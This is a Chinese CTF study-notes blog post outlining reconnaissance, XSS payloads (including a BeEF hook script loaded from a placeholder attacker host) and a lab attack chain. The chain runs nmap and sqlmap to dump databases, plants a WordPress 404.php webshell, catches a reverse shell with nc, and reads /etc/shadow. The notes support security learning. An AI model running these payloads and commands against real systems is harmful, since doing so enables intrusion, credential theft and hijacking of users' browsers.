---
title: "notectf"
date: 2026-01-21 19:39:43
categories:
  - ctf学习
  - 网课笔记
tags: [ctf相关]
---



## ctf



#### 1.python requests



#### 2.信息收集



2.1谷歌黑客搜索语法

fofa

github泄露源码和账号密码



2.2 主动信息收集

网站指纹识别

端口扫描

目录扫描

子域名扫描

漏洞扫描



# 

#### 3. XSS 攻击

3.1 反射型（非持久）

- 特征：恶意代码通过 URL 传入，单次请求生效

- 常见攻击方式：

  

  重定向：

  ```
  <script>window.location="恶意网址"</script>
  ```

  

   图片加载恶意脚本：

  ```
  <img src="http://BeEF_IP:3000/hook.js">
  ```

  

   脚本标签：

  ```
  <script src="恶意xss.js"></script>
  ```

  

   绕过滤：大小写、URL/Base64 编码

  ```
  <ScrIpT>      URL/Base64 编码
  ```

  

3.2 存储型（持久）

- 特征：恶意代码存到服务器（数据库 / 留言板等），所有访问者中招
- 核心：代码提交后被持久化，影响范围更广

#### 



#### 4.1 web——sql注入

1.扫描主机服务信息以及服务版本

-q 安静模式

nmap -sV -q ip

1.1 指定扫描「Top 100 个最常用端口」（比默认 1000 个少 90%），同时保留版本探测：

nmap -sV --top-ports 100 ip

2.快速扫描 主机全部信息

nmap -T4 -A -v ip

3.探测敏感信息

nikto -host http://ip:端口

4.sql注入寻找漏洞

1.sqlmap -u “ip”

2.sqlmap -u “ip" --dbs

3.sqlmap -u “ip”-D "数据库名" --tables

4.sqlmap -u “ip”-D "数据库名" -T "表名" --columns

5.sqlmap -u “ip”-D "数据库名" -T "表名" -C “列名”--dump

6.sqlmap -r request.raw -level 5 -risk 3 -dbs -dbm mysql --batch

request.raw报头

5.上传webshell获取控制权

wordpress后台寻找上传点

-- 主题的404.Php 可以上传

--webshell 获取 /usr/ share/webshells/php/

执行shell，获取反弹shell

http：//靶场ip：端口号/目录/wp-content/themes/主题名/404.php

启动监听

-- nc -nvlp port

启动终端

-- python -c "import pty;pty.spawn('/bin/bash')"

root权限

--查看敏感文件

cat/atc/shadow 

cat/atc/passwd

-- 使用su -提权





#### 5.文件上传漏洞

